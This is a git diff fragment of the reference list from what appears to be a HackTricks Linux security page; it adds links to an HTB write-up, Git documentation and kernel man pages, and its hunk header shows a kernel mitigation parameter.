-- [21] [binfmt_misc — Linux Kernel documentation](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
+- [21] [binfmt_misc — The Linux Kernel documentation](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
 - [22] [MIME Applications Associations](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
 - [23] [Shared MIME-info specification](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
 - [24] [Desktop Entry specification](https://specifications.freedesktop.org/desktop-entry/latest-single/)
@@ -309,4 +339,9 @@ initcall_blacklist=algif_aead_init
 - [27] [Linux crypto Makefile](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
 - [28] [CERT VU#260001: Linux kernel AF_ALG page cache vulnerability](https://kb.cert.org/vuls/id/260001)
 - [29] [modprobe(8) — Linux manual page](https://man7.org/linux/man-pages/man8/modprobe.8.html)
+- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
+- [31] [Git `hash-object` documentation](https://git-scm.com/docs/git-hash-object)
+- [32] [Git `ls-tree` documentation](https://git-scm.com/docs/git-ls-tree)
+- [33] [Git configuration documentation](https://git-scm.com/docs/git-config)
+- [34] [`openat2(2)` — Linux manual page](https://man7.org/linux/man-pages/man2/openat2.2.html)
 {{#include ../../banners/hacktricks-training.md}}
